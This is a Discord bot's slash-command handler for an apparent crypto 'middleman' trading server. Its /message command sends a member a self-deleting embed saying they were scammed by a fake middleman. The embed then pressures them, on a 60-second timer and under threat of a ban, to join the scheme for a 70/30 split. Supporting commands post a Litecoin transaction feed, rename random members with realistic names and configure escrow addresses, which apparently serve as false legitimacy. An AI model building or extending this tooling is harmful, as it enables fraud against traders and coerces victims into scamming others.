const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ContainerBuilder,
  EmbedBuilder,
  MessageFlags,
  PermissionFlagsBits,
  SectionBuilder,
  SeparatorBuilder,
  TextDisplayBuilder,
} = require('discord.js');
const {
  marketplaceRulesEmbed,
  mmTosEmbed,
  mmPanelEmbed,
  boosterRewardsEmbed,
  inviteRewardsEmbed,
  supportPanelEmbed,
  refundPolicyEmbed,
} = require('./embeds');
const { isConfigured } = require('./tickets');
const { canManageTickets } = require('./interactions');
const { deleteUserReputation, getReputation, giveReputation } = require('./reputation');
const { saveConfig } = require('./config');
const { deleteUserCryptoSessions, scheduleCryptoConfirmation } = require('./cryptoEscrow');
const { startTxidFeed, stopTxidFeed } = require('./txidFeed');
const { cancelRenameJob, deleteUserRenameData } = require('./renameJobs');

function reputationEmbed(user, summary, title = 'Reputation') {
  const average = summary.count ? summary.average.toFixed(2) : 'No ratings yet';
  return new EmbedBuilder()
    .setTitle(title)
    .setColor('#FFD700')
    .setThumbnail(user.displayAvatarURL({ size: 128 }))
    .setDescription(`${user} has **${summary.count} rep${summary.count === 1 ? '' : 's'}**.`)
    .addFields({ name: 'Average rating', value: summary.count ? `⭐ **${average}/5**` : average })
    .setTimestamp();
}

const realisticNames = [
  'Adam', 'Alex', 'Amelia', 'Ava', 'Benjamin', 'Blake', 'Caleb', 'Cameron', 'Charlotte', 'Chloe',
  'Daniel', 'David', 'Dylan', 'Eleanor', 'Elijah', 'Ella', 'Emily', 'Emma', 'Ethan', 'Evelyn',
  'Gabriel', 'Grace', 'Hannah', 'Harper', 'Henry', 'Isabella', 'Jack', 'Jacob', 'James', 'Jasmine',
  'Jayden', 'Joseph', 'Layla', 'Leo', 'Liam', 'Lily', 'Logan', 'Lucas', 'Mason', 'Mia',
  'Nathan', 'Noah', 'Nora', 'Oliver', 'Olivia', 'Owen', 'Ryan', 'Samuel', 'Scarlett', 'Sophia',
  'Theodore', 'Thomas', 'Victoria', 'William', 'Willow', 'Zoe', 'Aaron', 'Alice', 'Isaac', 'Sophie',
];

function shuffled(values) {
  const copy = [...values];
  for (let index = copy.length - 1; index > 0; index -= 1) {
    const swapIndex = Math.floor(Math.random() * (index + 1));
    [copy[index], copy[swapIndex]] = [copy[swapIndex], copy[index]];
  }
  return copy;
}

function hasRenameRole(member, targetRoleId, excludedRoleIds) {
  return member.roles.cache.has(targetRoleId) &&
    !member.roles.cache.some(role => excludedRoleIds.has(role.id));
}

async function collectRecentlyActiveMembers(guild, members, targetRoleId, excludedRoleIds, wanted) {
  const channels = await guild.channels.fetch().catch(() => null);
  if (!channels) return 0;
  const readable = shuffled([...channels.values()].filter(channel =>
    channel?.isTextBased() && channel.messages?.fetch
  )).slice(0, 100);
  let found = 0;
  let individualFetches = 0;
  const individualFetchLimit = Math.min(1000, Math.max(100, wanted * 2));
  const attemptedIds = new Set(members.keys());
  for (const channel of readable) {
    try {
      let before;
      for (let pageNumber = 0; pageNumber < 5; pageNumber += 1) {
        const messages = await channel.messages.fetch({ limit: 100, before });
        if (!messages.size) break;
        for (const message of messages.values()) {
          const authorId = message.author?.id;
          if (!authorId || message.author.bot || attemptedIds.has(authorId)) continue;
          attemptedIds.add(authorId);

          let member = message.member;
          if (!member && individualFetches < individualFetchLimit) {
            individualFetches += 1;
            member = await guild.members.fetch(authorId).catch(() => null);
          }
          if (!member || member.user.bot) continue;
          members.set(member.id, member);
          if (hasRenameRole(member, targetRoleId, excludedRoleIds)) found += 1;
        }
        const eligibleFound = [...members.values()].filter(member =>
          !member.user.bot &&
          member.id !== guild.ownerId &&
          hasRenameRole(member, targetRoleId, excludedRoleIds) &&
          member.manageable
        ).length;
        if (eligibleFound >= wanted || messages.size < 100) break;
        before = messages.lastKey();
      }
      const eligibleFound = [...members.values()].filter(member =>
        !member.user.bot &&
        member.id !== guild.ownerId &&
        hasRenameRole(member, targetRoleId, excludedRoleIds) &&
        member.manageable
      ).length;
      if (eligibleFound >= wanted) break;
    } catch {
      // Skip channels where the bot cannot read message history.
    }
  }
  return found;
}

async function handleSlash(interaction, config) {
  const name = interaction.commandName;
  if (name === 'deletedata') {
    if (!interaction.options.getBoolean('confirm')) {
      return interaction.reply({ content: 'No data was deleted. Run `/deletedata confirm:true` to confirm permanent deletion.', ephemeral: true });
    }
    const reputationRecords = deleteUserReputation(interaction.user.id);
    const cryptoSessions = deleteUserCryptoSessions(interaction.user.id);
    const renameJobs = deleteUserRenameData(interaction.user.id);
    return interaction.reply({
      content: `✅ Your stored bot data was deleted (${reputationRecords} reputation record${reputationRecords === 1 ? '' : 's'}, ${cryptoSessions} payment session${cryptoSessions === 1 ? '' : 's'}, and ${renameJobs} pending rename job${renameJobs === 1 ? '' : 's'}). Discord messages already posted in channels are not removed.`,
      ephemeral: true,
    });
  }
  if (name === 'start' && interaction.options.getSubcommand() === 'txid') {
    if (!interaction.channel?.isTextBased()) {
      return interaction.reply({ content: 'Run this command in a text channel.', ephemeral: true });
    }
    const started = startTxidFeed(interaction.channel, interaction.client);
    return interaction.reply({
      content: started
        ? '✅ TXID feed started here. A confirmed Litecoin transaction will be posted every 30 seconds–3 minutes.'
        : 'The TXID feed is already running in this channel.',
      ephemeral: true,
    });
  }
  if (name === 'stop' && interaction.options.getSubcommand() === 'txid') {
    const stopped = stopTxidFeed(interaction.channelId);
    return interaction.reply({
      content: stopped ? '🛑 TXID feed stopped in this channel.' : 'No TXID feed is running in this channel.',
      ephemeral: true,
    });
  }
  if (name === 'message') {
    const target = interaction.options.getUser('user');
    if (target.bot) return interaction.reply({ content: 'Choose a real member, not a bot.', ephemeral: true });

    const embed = new EmbedBuilder()
      .setTitle('TRADE COMPROMISED - READ IMMEDIATELY')
      .setColor('#ED4245')
      .setDescription(
        target + ",\n\n" +
        "Look, we're just going to be completely upfront with you: **you just got scammed.**\n\n" +
        "The person you used for the trade was a **fake middleman**. Your item has already been transferred away, and you are **NOT getting your item back under any circumstances**. Opening a ticket or complaining to server staff isn't going to fix anything because the trade is done and it's gone.\n\n" +
        "However, instead of just taking your stuff and blocking you, we're giving you an actual opportunity.\n" +
        "We do this constantly, and we're offering to let you join us on a **70/30% profit split**. You work with us to bring in more trades, and you get to keep **70%** of the profit while we only take a **30%** cut. You'll easily make back whatever item you just lost.\n\n" +
        "You have two choices right now:\n" +
        "[ YES ] - Join us, get access to the group, and take your 70% cut.\n" +
        "[ NO ] - Decline the offer and receive an immediate, permanent Discord ban.\n\n" +
        "Make your decision. You have **60 seconds** to respond."
      )
      .setFooter({ text: 'You have 60 seconds to respond - choose below' })
      .setTimestamp();
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('choice_yes:' + target.id).setLabel('YES').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('choice_no:' + target.id).setLabel('NO').setStyle(ButtonStyle.Danger)
    );
    await interaction.reply({ content: '' + target, embeds: [embed], components: [row], allowedMentions: { users: [target.id] } });
    try {
      const sentMsg = await interaction.fetchReply();
      setTimeout(async () => {
        try {
          const fresh = await sentMsg.fetch().catch(() => null);
          if (!fresh) return;
          await fresh.delete().catch(() => null);
        } catch {}
      }, 60 * 1000);
    } catch {}
    return;
  }
  if (name === 'setup-rules') {
    if (!isConfigured(config.channels.rulesChannelId)) return interaction.reply({ content: 'Set rulesChannelId first.', ephemeral: true });
    const ch = await interaction.guild.channels.fetch(config.channels.rulesChannelId);
    await ch.send({ embeds: [marketplaceRulesEmbed(config)] });
    return interaction.reply({ content: `Rules posted in ${ch}.`, ephemeral: true });
  }
  if (name === 'setup-tos') {
    if (!isConfigured(config.channels.mmTosChannelId)) return interaction.reply({ content: 'Set mmTosChannelId first.', ephemeral: true });
    const ch = await interaction.guild.channels.fetch(config.channels.mmTosChannelId);
    await ch.send({ embeds: [mmTosEmbed(config)] });
    return interaction.reply({ content: `TOS posted in ${ch}.`, ephemeral: true });
  }
  if (name === 'setup-mm-panel') {
    if (!isConfigured(config.channels.mmPanelChannelId)) return interaction.reply({ content: 'Set mmPanelChannelId first.', ephemeral: true });
    const ch = await interaction.guild.channels.fetch(config.channels.mmPanelChannelId);
    const { embed, row } = mmPanelEmbed(config);
    await ch.send({ embeds: [embed], components: [row] });
    return interaction.reply({ content: `MM panel posted in ${ch}.`, ephemeral: true });
  }
  if (name === 'setup-boosts') {
    if (!isConfigured(config.channels.boosterChannelId)) return interaction.reply({ content: 'Set boosterChannelId first.', ephemeral: true });
    const ch = await interaction.guild.channels.fetch(config.channels.boosterChannelId);
    await ch.send({ embeds: [boosterRewardsEmbed(config)] });
    return interaction.reply({ content: `Boosts posted in ${ch}.`, ephemeral: true });
  }
  if (name === 'claim') {
    if (!canManageTickets(interaction.member, config)) return interaction.reply({ content: 'Only MM / Staff.', ephemeral: true });
    return interaction.reply({ content: `${interaction.user} claimed this ticket.` });
  }
  if (name === 'add') {
    if (!canManageTickets(interaction.member, config)) {
      return interaction.reply({ content: 'Only MM / Staff can add members to tickets.', ephemeral: true });
    }
    const channel = interaction.channel;
    const isTicket = channel?.isTextBased()
      && (channel.topic?.startsWith('MM ticket |')
        || channel.topic?.startsWith('Crypto MM |')
        || channel.parentId === config.channels?.mmTicketCategoryId);
    if (!isTicket || !channel.permissionOverwrites) {
      return interaction.reply({ content: 'Use this command inside an MM ticket.', ephemeral: true });
    }

    const user = interaction.options.getUser('id');
    if (user.bot) {
      return interaction.reply({ content: 'Choose a server member, not a bot.', ephemeral: true });
    }
    const member = await interaction.guild.members.fetch(user.id).catch(() => null);
    if (!member) {
      return interaction.reply({ content: 'That user is not a member of this server.', ephemeral: true });
    }

    await channel.permissionOverwrites.edit(member.id, {
      ViewChannel: true,
      SendMessages: true,
      ReadMessageHistory: true,
    });
    return interaction.reply({
      content: `✅ ${member} was added to this ticket by ${interaction.user}.`,
      allowedMentions: { users: [member.id, interaction.user.id] },
    });
  }
  if (name === 'role') {
    if (!interaction.member?.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: 'Only administrators can use this command.', ephemeral: true });
    }

    const role = interaction.options.getRole('role');
    const amount = interaction.options.getInteger('amount');
    const dangerousPermissions = [
      PermissionFlagsBits.Administrator,
      PermissionFlagsBits.ManageGuild,
      PermissionFlagsBits.ManageRoles,
      PermissionFlagsBits.BanMembers,
      PermissionFlagsBits.KickMembers,
      PermissionFlagsBits.ModerateMembers,
    ];
    if (role.id === interaction.guild.roles.everyone.id || role.managed) {
      return interaction.reply({ content: 'Choose a normal server role that is not managed by Discord or an integration.', ephemeral: true });
    }
    if (dangerousPermissions.some(permission => role.permissions.has(permission))) {
      return interaction.reply({ content: 'For safety, `/role` cannot randomly assign administrative or moderation roles.', ephemeral: true });
    }
    if (!role.editable) {
      return interaction.reply({ content: 'I cannot assign that role. Move my bot role above it in the server role list.', ephemeral: true });
    }
    if (interaction.user.id !== interaction.guild.ownerId && role.position >= interaction.member.roles.highest.position) {
      return interaction.reply({ content: 'You can only assign roles below your highest role.', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });
    const members = new Map();
    let after;
    do {
      const page = await interaction.guild.members.list({ limit: 1000, after, cache: true });
      for (const member of page.values()) members.set(member.id, member);
      if (page.size < 1000) break;
      after = page.lastKey();
    } while (after);

    const eligible = [...members.values()].filter(member => !member.user.bot && !member.roles.cache.has(role.id));
    if (!eligible.length) {
      return interaction.editReply({ content: `No eligible members were found. Everyone already has ${role}, or only bots were available.` });
    }
    for (let index = eligible.length - 1; index > 0; index -= 1) {
      const swapIndex = Math.floor(Math.random() * (index + 1));
      [eligible[index], eligible[swapIndex]] = [eligible[swapIndex], eligible[index]];
    }

    const selected = eligible.slice(0, Math.min(amount, eligible.length));
    const added = [];
    const failed = [];
    for (const member of selected) {
      try {
        await member.roles.add(role, `Random role assignment requested by ${interaction.user.tag}`);
        added.push(member);
      } catch {
        failed.push(member);
      }
    }

    const names = added.map(member => member.user.tag).join(', ');
    const visibleNames = names.length > 1400 ? `${names.slice(0, 1397)}...` : names;
    return interaction.editReply({
      content:
        `✅ Added ${role} to **${added.length}** random member${added.length === 1 ? '' : 's'}.` +
        (eligible.length < amount ? ` Only **${eligible.length}** members were eligible.` : '') +
        (failed.length ? ` **${failed.length}** assignment${failed.length === 1 ? '' : 's'} failed.` : '') +
        (visibleNames ? `\n\n**Selected:** ${visibleNames}` : ''),
      allowedMentions: { parse: [] },
    });
  }
  if (name === 'rename') {
    if (!interaction.member?.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: 'Only administrators can use this command.', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });
    const count = interaction.options.getInteger('count');
    cancelRenameJob(interaction.guildId);
    const targetRole = interaction.guild.roles.cache.find(role =>
      role.name.trim().toLowerCase() === 'member'
    );
    if (!targetRole) {
      return interaction.editReply({ content: 'I could not find a role named **Member** (capitalization does not matter).' });
    }
    const excludedRoleIds = new Set(interaction.guild.roles.cache
      .filter(role => role.name.trim().toLowerCase() === 'members')
      .keys());
    const members = new Map(interaction.guild.members.cache.map(member => [member.id, member]));
    let fullListAvailable = true;
    try {
      let after;
      do {
        const page = await interaction.guild.members.list({ limit: 1000, after, cache: true });
        for (const member of page.values()) members.set(member.id, member);
        if (page.size < 1000) break;
        after = page.lastKey();
      } while (after);
    } catch (error) {
      fullListAvailable = false;
      console.warn(`[rename] Full member list unavailable; using cached members: ${error.message}`);
    }

    const cachedEligibleCount = [...members.values()].filter(member =>
      !member.user.bot &&
      member.id !== interaction.guild.ownerId &&
      hasRenameRole(member, targetRole.id, excludedRoleIds) &&
      member.manageable
    ).length;
    if (!fullListAvailable && cachedEligibleCount < count) {
      await collectRecentlyActiveMembers(interaction.guild, members, targetRole.id, excludedRoleIds, count);
    }

    const manageable = [...members.values()].filter(member =>
      !member.user.bot &&
      member.id !== interaction.guild.ownerId &&
      hasRenameRole(member, targetRole.id, excludedRoleIds) &&
      member.manageable
    );
    const online = manageable.filter(member => member.presence && member.presence.status !== 'offline');
    const usedOnlineFilter = online.length >= Math.min(count, manageable.length);
    const candidates = shuffled(usedOnlineFilter ? online : manageable);
    if (!candidates.length) {
      return interaction.editReply({ content: 'No manageable users with **Member** and without **Members** are currently available.' });
    }

    const selected = candidates.slice(0, Math.min(count, candidates.length));
    const names = shuffled(realisticNames);
    const renamed = [];
    const failed = [];
    for (let index = 0; index < selected.length; index += 1) {
      const member = selected[index];
      const baseName = names[index % names.length];
      const nickname = index < names.length ? baseName : `${baseName} ${Math.floor(index / names.length) + 1}`;
      try {
        await member.setNickname(nickname, `Random realistic rename requested by ${interaction.user.tag}`);
        renamed.push(`${member.user.tag} → ${nickname}`);
      } catch {
        failed.push(member.user.tag);
      }
    }

    const details = renamed.join('\n');
    const visibleDetails = details.length > 1400 ? `${details.slice(0, 1397)}...` : details;
    const remaining = Math.max(0, count - renamed.length);
    return interaction.editReply({
      content:
        `✅ Renamed **${renamed.length}** random ${usedOnlineFilter ? 'online ' : ''}user${renamed.length === 1 ? '' : 's'} with **Member** and without **Members**.` +
        (!usedOnlineFilter ? '\nPresence data was incomplete, so the command used manageable members found in the server cache and recent channel activity.' : '') +
        (remaining ? `\nOnly **${renamed.length}** of the requested **${count}** eligible users were currently available. No background rename job was created.` : '') +
        (failed.length ? `\n**${failed.length}** rename${failed.length === 1 ? '' : 's'} failed.` : '') +
        (visibleDetails ? `\n\n${visibleDetails}` : ''),
      allowedMentions: { parse: [] },
    });
  }
  if (name === 'close') {
    if (!canManageTickets(interaction.member, config)) return interaction.reply({ content: 'Only MM / Staff.', ephemeral: true });
    const reason = interaction.options.getString('reason') || 'No reason';
    await interaction.reply({ content: `Closing in 5s. Reason: ${reason}` });
    setTimeout(() => interaction.channel.delete().catch(() => null), 5000);
    return;
  }
  if (name === 'vouch') {
    const user = interaction.options.getUser('user');
    const message = interaction.options.getString('message');
    const rating = interaction.options.getInteger('rating');
    const embed = new EmbedBuilder().setTitle('New Vouch').setColor('#57F287');
    embed.setThumbnail(user.displayAvatarURL({ size: 128 }));
    embed.setTimestamp();
    let desc = `**From:** ${interaction.user}\n**To:** ${user}\n**Channel:** ${interaction.channel}\n\n${message}`;
    if (rating) desc += `\n\nRating: ${'⭐'.repeat(rating)} (${rating}/5)`;
    embed.setDescription(desc);
    await interaction.reply({ embeds: [embed] });
    return;
  }
  if (name === 'rep') {
    const user = interaction.options.getUser('user');
    const stars = interaction.options.getInteger('stars');
    const message = interaction.options.getString('message');

    if (user.id === interaction.user.id) {
      return interaction.reply({ content: 'You cannot give reputation to yourself.', ephemeral: true });
    }
    if (user.bot) {
      return interaction.reply({ content: 'You cannot give reputation to a bot.', ephemeral: true });
    }

    const summary = giveReputation({
      guildId: interaction.guildId,
      recipientId: user.id,
      giverId: interaction.user.id,
      stars,
      message,
    });
    const embed = reputationEmbed(user, summary, summary.updated ? 'Reputation Updated' : 'New Reputation');
    embed.addFields(
      { name: 'From', value: `${interaction.user}`, inline: true },
      { name: 'Rating', value: `${'⭐'.repeat(stars)} (${stars}/5)`, inline: true },
    );
    if (message) embed.addFields({ name: 'Feedback', value: message });
    embed.setFooter({ text: summary.updated ? 'Your previous rep for this user was updated.' : 'Thanks for leaving a rep!' });

    await interaction.reply({ embeds: [embed] });
    return;
  }
  if (name === 'reps') {
    const user = interaction.options.getUser('user') || interaction.user;
    const summary = getReputation(interaction.guildId, user.id);
    return interaction.reply({ embeds: [reputationEmbed(user, summary)] });
  }
  if (name === 'setup' && interaction.options.getSubcommand() === 'automm') {
    const coins = [
      ['btc', '₿', 'Bitcoin', 'Bitcoin network'],
      ['eth', 'Ξ', 'Ethereum', 'Ethereum network'],
      ['ltc', 'Ł', 'Litecoin', 'Litecoin network'],
      ['sol', '◎', 'Solana', 'Solana network'],
    ];
    const panel = new ContainerBuilder()
      .setAccentColor(0x57F287)
      .addTextDisplayComponents(new TextDisplayBuilder().setContent(
        '# Start Cryptocurrency Deal\n' +
        'Choose the coin and network for your deal. A private guided ticket will open for both traders.'
      ));
    coins.forEach(([key, symbol, label, network]) => {
      panel.addSeparatorComponents(new SeparatorBuilder().setDivider(true));
      panel.addSectionComponents(
        new SectionBuilder()
          .addTextDisplayComponents(new TextDisplayBuilder().setContent(`## ${symbol} ${label}\n${network}`))
          .setButtonAccessory(
            new ButtonBuilder().setCustomId(`crypto_open_ticket_${key}`).setLabel('Start').setStyle(ButtonStyle.Success)
          )
      );
    });
    panel.addSeparatorComponents(new SeparatorBuilder().setDivider(true));
    panel.addTextDisplayComponents(new TextDisplayBuilder().setContent(
      `-# ${config.branding?.serverName || 'Crypto Middleman'} • Never send funds outside the private ticket instructions.`
    ));
    await interaction.channel.send({ components: [panel], flags: MessageFlags.IsComponentsV2 });
    return interaction.reply({ content: '✅ Auto middleman panel posted in this channel.', ephemeral: true });
  }
  if (name === 'setup' && interaction.options.getSubcommand() === 'invites') {
    await interaction.channel.send({
      content: '@everyone',
      embeds: [inviteRewardsEmbed(config)],
      allowedMentions: { parse: ['everyone'] },
    });
    return interaction.reply({ content: '✅ Invite rewards panel posted in this channel.', ephemeral: true });
  }
  if (name === 'setup' && interaction.options.getSubcommand() === 'marketplace-rules') {
    await interaction.channel.send({ embeds: [marketplaceRulesEmbed(config)] });
    return interaction.reply({ content: '✅ Marketplace rules panel posted in this channel.', ephemeral: true });
  }
  if (name === 'setup' && interaction.options.getSubcommand() === 'support') {
    await interaction.channel.send({ embeds: [supportPanelEmbed(config)] });
    return interaction.reply({ content: '✅ Support panel posted in this channel.', ephemeral: true });
  }
  if (name === 'setup' && interaction.options.getSubcommand() === 'refund-policy') {
    await interaction.channel.send({ embeds: [refundPolicyEmbed(config)] });
    return interaction.reply({ content: '✅ Refund policy panel posted in this channel.', ephemeral: true });
  }
  if (name === 'crypto-setup') {
    const asset = interaction.options.getString('asset').trim();
    const network = interaction.options.getString('network').trim();
    const escrowAddresses = [...new Set(interaction.options.getString('address').split(',').map(value => value.trim()).filter(Boolean))];
    if (!escrowAddresses.length) return interaction.reply({ content: 'Enter at least one real escrow receiving address.', ephemeral: true });
    config.crypto = { asset, network, escrowAddress: escrowAddresses[0], escrowAddresses, amountCurrency: 'USD' };
    saveConfig(config);
    return interaction.reply({
      content: `✅ Crypto escrow configured.\nAsset: **${asset}**\nNetwork: **${network}**\nVerified receiving addresses: **${escrowAddresses.length}**`,
      ephemeral: true,
    });
  }
  if (name === 'confirm') {
    if (!canManageTickets(interaction.member, config)) {
      return interaction.reply({ content: 'Only an administrator, MM, or Staff member can confirm payments.', ephemeral: true });
    }
    const ticketReference = interaction.options.getString('ticket');
    await interaction.deferReply({ ephemeral: true });
    try {
      const { channel } = await scheduleCryptoConfirmation(interaction.guild, ticketReference, interaction.user, interaction.client);
      return interaction.editReply({ content: `⏳ Payment confirmation is pending for ${channel}.` });
    } catch (error) {
      return interaction.editReply({ content: `Could not confirm payment: ${error.message}` });
    }
  }
  if (name === 'setup-all') {
    await interaction.deferReply({ ephemeral: true });
    const out = [];
    const jobs = [
      ['rulesChannelId', marketplaceRulesEmbed(config)],
      ['mmTosChannelId', mmTosEmbed(config)],
      ['boosterChannelId', boosterRewardsEmbed(config)],
    ];
    for (const pair of jobs) {
      const key = pair[0];
      const embed = pair[1];
      const id = config.channels[key];
      if (!isConfigured(id)) { out.push(`${key}: skipped`); continue; }
      try {
        const ch = await interaction.guild.channels.fetch(id);
        await ch.send({ embeds: [embed] });
        out.push(`${key}: posted in #${ch.name}`);
      } catch (e) { out.push(`${key}: FAILED ${e.message}`); }
    }
    if (isConfigured(config.channels.mmPanelChannelId)) {
      try {
        const ch = await interaction.guild.channels.fetch(config.channels.mmPanelChannelId);
        const { embed, row } = mmPanelEmbed(config);
        await ch.send({ embeds: [embed], components: [row] });
        out.push(`mmPanelChannelId: posted in #${ch.name}`);
      } catch (e) { out.push(`mmPanelChannelId: FAILED ${e.message}`); }
    } else out.push('mmPanelChannelId: skipped');
    return interaction.editReply({ content: out.join('\n') });
  }
}

module.exports = { handleSlash };
